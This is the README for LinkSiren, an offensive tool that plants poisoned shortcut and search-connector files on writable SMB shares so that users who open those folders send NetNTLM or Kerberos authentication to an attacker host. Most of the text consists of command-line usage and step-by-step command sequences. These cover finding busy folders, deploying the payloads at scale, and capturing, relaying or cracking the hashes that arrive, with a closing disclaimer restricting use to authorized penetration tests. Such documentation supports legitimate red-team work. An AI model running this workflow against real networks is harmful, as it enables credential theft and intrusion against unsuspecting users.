# Description
_The Siren waits thee, singing song for song._ - Walter Savage Landor

LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.

# Installation
Install using pip
```
# Optional: Create a virtual environment
python -m pip install linksiren

# Run with -h to output help info
linksiren -h
```

Install from source
```
# Download source code
git clone https://github.com/gjhami/LinkSiren.git
cd LinkSiren

# Optional: Set up a virtual environment and install requirements
python -m venv .venv
source ./.venv/bin/activate # Linux
# .\.venv\Scripts\activate # Windows

# Install requirements
python -m pip install -r requirements.txt

# Run with -h to output help info
python ./src/linksiren/__main__.py -h
```

# Usage
LinkSiren offers the following modes of operation:

## Generate
Create poisoned files to use for coercion and store them locally.
```
linksiren generate --help
usage: link_siren.py generate [-h] -a ATTACKER [-n PAYLOAD]

optional arguments:
  -h, --help            show this help message and exit
  -n PAYLOAD, --payload PAYLOAD
                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
                        .searchConnector-ms, .lnk, or .url

Required Arguments:
  -a ATTACKER, --attacker ATTACKER
                        Attacker IP or hostname to place in malicious URL
```

## Rank
Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
```
linksiren rank --help
usage: link_siren.py rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]

optional arguments:
  -h, --help            show this help message and exit
  -md MAX_DEPTH, --max-depth MAX_DEPTH
                        (Default: 3) The maximum depth of folders to search within the target.
  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
                        (Default: 2) Number of days as an integer for active files.
  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on.
                        Ranks are all set to 1 assigned.

Required Arguments:
  -u USERNAME, --username USERNAME
                        Username for authenticating to each share
  -p PASSWORD, --password PASSWORD
                        Password for authenticating to each share
  -d DOMAIN, --domain DOMAIN
                        Domain for authenticating to each share.Specify "." for local authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to file shares / base directories within which to rank
                        folders as potential locations for placing poisoned files.
```

## Identify
Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
```
linksiren identify --help
usage: link_siren.py identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
                              [-mf MAX_FOLDERS_PER_TARGET]

optional arguments:
  -h, --help            show this help message and exit
  -md MAX_DEPTH, --max-depth MAX_DEPTH
                        (Default: 3) The maximum depth of folders to search within the target
  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
                        (Default: 2) Max number of days since within which a file is considered active.
  -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on.
                        Ranks are all set to 1.
  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
                        (Default: 10) Maximum number of folders to output as deployment targets per supplied target share or
                        folder.

Required Arguments:
  -u USERNAME, --username USERNAME
                        Username for authenticating to each share
  -p PASSWORD, --password PASSWORD
                        Password for authenticating to each share
  -d DOMAIN, --domain DOMAIN
                        Domain for authenticating to each share.Specify "." for local authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to file shares / base directories for deployment or from
                        which to remove payload files
```

## Deploy
Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
```
linksiren deploy --help
usage: link_siren.py deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]

optional arguments:
  -h, --help            show this help message and exit
  -n PAYLOAD, --payload PAYLOAD
                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
                        .searchConnector-ms, .lnk, or .url

Required Arguments:
  -u USERNAME, --username USERNAME
                        Username for authenticating to each share
  -p PASSWORD, --password PASSWORD
                        Password for authenticating to each share
  -d DOMAIN, --domain DOMAIN
                        Domain for authenticating to each share.Specify "." for local authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
  -a ATTACKER, --attacker ATTACKER
                        Attacker IP or hostname to place in poisoned files.
```

## Cleanup
Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
```
linksiren cleanup --help
usage: link_siren.py cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]

optional arguments:
  -h, --help            show this help message and exit
  -n PAYLOAD, --payload PAYLOAD
                        (Default: @Test_Do_Not_Remove.searchConnector-ms) Name of payload file ending in .library-ms,
                        .searchConnector-ms, .lnk, or .url

Required Arguments:
  -u USERNAME, --username USERNAME
                        Username for authenticating to each share
  -p PASSWORD, --password PASSWORD
                        Password for authenticating to each share
  -d DOMAIN, --domain DOMAIN
                        Domain for authenticating to each share.Specify "." for local authentication
  -t TARGETS, --targets TARGETS
                        Path to a text file containing UNC paths to folders in which poisoned files are located.
  -a ATTACKER, --attacker ATTACKER
                        Attacker IP or hostname to place in poisoned files.
```

## Attack Overview
1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse).
2. Create a list of UNC paths to writeable SMB shares.
    - Note: Make sure you can delete files in them for cleanup.
3. [Optional] Run LinkSiren in `generate` mode to write templates locally
4. [Optional] Run LinkSiren in `rank` mode to output rankings for accessible folders based on recent access.
5. Run LinkSiren in `identify` mode to find the best places to put poisoned files.
6. Start a listener or relay on your attacker machine to capture and/or relay coerced authentication.
7. Run LinkSiren in `deploy` mode to place payloads in the optimal locations identified.
8. Let the hashes roll in. Relay and/or crack as desired.
9. Run LinkSiren in `cleanup` mode to delete all the poisoned files.

## What Payload Type Should I Use?
Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically, and are capable of coercing both SMB and HTTP authentication using a single file.

## How do I use this NOW?
```bash
# Setup
git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
python -m pip install -r requirements.txt

# Identify optimal locations for poisoned file deployment
linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>

# Deploy to identified locations
linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>

# Capture hashes / relay authentication

# Cleanup poisoned files
linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
```

## How do I use this the \~right\~ way?
```bash
# Get the project
git clone https://github.com/gjhami/LinkSiren.git
cd LinkSiren

# Set up a virtual environment and install requirements
python -m venv .venv
source ./.venv/bin/activate # Linux
# .\.venv\Scripts\activate # Windows
python -m pip install -r requirements.txt

# 1. Create a targets file containing accessible shares, one per line, in the following format: \\server.domain.tld\share
#    I recommend crackmapexec or shareenum, make sure you can delete files you deploy

# 2. Use LinkSiren to identify the most active folders on them
#    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
#    Note: Specify '.' as the domain to log in using a local user account
linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>

# 3. Use LinkSiren to deploy payloads to all of the active folders
#    --identify saves UNC paths to active folders in folder_targets.txt
linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>

# 4. Let the hashes come to you and relay them as you see fit :)
#    Use CrackMapExec and LdapRelayScan for relay target identification
#    Use LdapRelayScan to determine if you can relay HTTP auth to LDAP
#    Use Impacket's ntlmrelayx for relay with pcredz for hash capture on the attacker machine
#    You could also use KrbJack to relay kerberos auth to a machine whose DNS record you've hijacked

# 5. Cleanup the payload files when you're finished gathering.
#    Set targets to a file containing UNC paths of all folders where payloads were written
#    --deploy saves UNC paths to deployed payloads in payload_folders.txt
#    Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
```

## How is this better than the other tools?
As in real estate, the three most important things when attempting to coerce auth using files: location, location, location. All techniques identified here only coerce authentication from users that open the folder containing the poisoned file.

Other tools are built to place a single malicious .searchConnector-ms, .library-ms, or .url file at a specified location and clean up that one malicious file. If you find yourself with access to a lot of shares you may want things to scale and you may not be in the mood to write a wrapper. Additionally, you may not know the best place to put a poisoned file in a sea of accessible shares.

LinkSiren crawls shares you currently have access to and ranks every subfolder based on the liklihood it will be opened by a user sometime soon. Then it uses this information to target malicious file distribution to multiple locations at once. Additionally, LinkSiren records the full UNC path of malicious file it creates, allowing for cleanup with a single command.

Summary
- Scales to an arbitrary number of malicious .searchConnector-ms, .library-ms, .url, or .lnk files
- Targeted malicious file placement
- Single command deployment and cleanup
- Cross platform with python

## How will you make it even better?
I'm looking to add the following features:
- [x] Start the WebClient service on targets using searchConnector-ms and library-ms files (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#start-the-webclient-service) and [Farmer Source Code](https://github.com/mdsecactivebreach/Farmer/blob/main/crop/Crop/Crop.cs))
- [x] Coerce HTTP authentication with WebDAV connection strings (see [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse))
- [ ] Add a safe mode that checks if a file can be deleted from a target share before deploying it.
    - This can be accomplished by reviewing ACLs over SMB but is only useful if the SIDs in the ACLs can be mapped to the username used to connect to the share. WMI / RPC over SMB could be used to get SID information to map SIDs to usernames (definitely local, maybe also domain). Alternatively, LDAP could be queries for SID information associated with domain users in AD environments.
    - Alternatively, this could be accomplished by attempting to write a test file to the target directory and then delete it. This is what crackmapexec does.
- [ ] Add an instructions sections that details how to get intranet zoned (Blog Post In Progress)
- [ ] Test for anonymous access to shares
- [ ] Add an explanation of how this can be used with ntlmrelayx (Blog Post In Progress)
- [ ] Multithreading/Multiprocessing for faster share crawling
- [ ] Add a progress bar for share crawling
- [ ] Enable authentication using a NTLM hash
- [ ] Enable ticket based authnentication (Kerberos)

## Note
This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
